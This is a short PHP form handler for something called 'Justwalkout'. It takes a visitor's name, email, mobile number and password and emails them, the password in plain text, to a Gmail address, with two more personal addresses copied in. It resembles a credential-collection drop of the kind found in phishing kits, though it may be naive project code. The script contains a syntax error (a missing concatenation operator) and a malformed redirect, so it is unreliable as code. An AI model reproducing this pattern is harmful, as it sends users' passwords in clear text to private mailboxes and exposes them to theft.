<?php
//get data from form  
$name = $_POST['username'];
$email= $_POST['email'];
$mobile= $_POST['number'];
$password= $_POST['password'];
$to = "teamcodeterror03@gmail.com";
$subject = "Mail From Justwalkout";
$txt ="Name = ". $name . "\r\n  Email = " . $email . "\r\n Mobile Number =" . $mobile "\r\n Password =" . $password;
$headers = "From: noreply@Justwalkout.com" . "\r\n" .
"CC: hetvi28102002@gmail.com , vatsal.bhimani@gmail.com ,";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:.html");
?>